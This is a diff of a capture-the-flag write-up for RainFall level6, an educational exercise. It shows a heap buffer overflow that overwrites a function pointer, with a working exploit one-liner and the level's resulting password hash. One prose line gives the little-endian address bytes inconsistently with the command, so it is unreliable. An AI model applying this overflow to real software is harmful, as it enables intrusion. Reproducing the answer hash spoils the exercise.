@@ -41,7 +41,8 @@ If we overflow the input buffer we can overwrite the function pointer with the a
 
 the offset is 72
 
-the address of n()
+- the address of n()
+
 ```
     (gdb) info functions
     All defined functions:
@@ -76,7 +77,7 @@ the address of n()
 
 the address of function n() is => 0x08048454  in little-indian \x54\x84\x08\x00
 
-we gone do Heap-based Buffer Overflow
+- we gone do Heap-based Buffer Overflow
 
 we need to overflow more than just 64 bytes to reach function_ptr.
 
@@ -84,5 +85,7 @@ we need to overflow more than just 64 bytes to reach function_ptr.
 
 then the function pointer is there.
 
-level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
-f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+    level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
+    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
